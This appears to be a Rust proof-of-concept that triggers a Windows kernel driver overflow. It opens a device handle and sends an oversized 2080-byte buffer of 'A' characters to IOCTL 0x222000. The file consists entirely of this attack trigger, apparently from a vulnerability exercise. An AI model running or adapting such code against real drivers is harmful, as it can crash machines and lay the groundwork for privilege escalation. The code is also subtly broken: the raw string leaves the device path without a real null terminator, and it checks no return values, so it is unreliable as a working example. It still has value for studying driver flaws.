extern crate winapi;
use winapi::um::fileapi::CreateFileA;
use winapi::um::ioapiset::DeviceIoControl;
use std::ptr::null_mut;

fn main() {
    unsafe {
        trigger();
    }
}

unsafe fn trigger() {
    let filename = r"\\.\ADevice\0";
    let fd = CreateFileA(filename.as_ptr() as _, 0xC0000000, 0, null_mut(), 0x3, 0, null_mut());
    let mut data = vec![b'A'; 2080];
    DeviceIoControl(fd, 0x222000, data.as_ptr() as _, data.len() as _, null_mut(), 0,  &mut 0, null_mut());
}

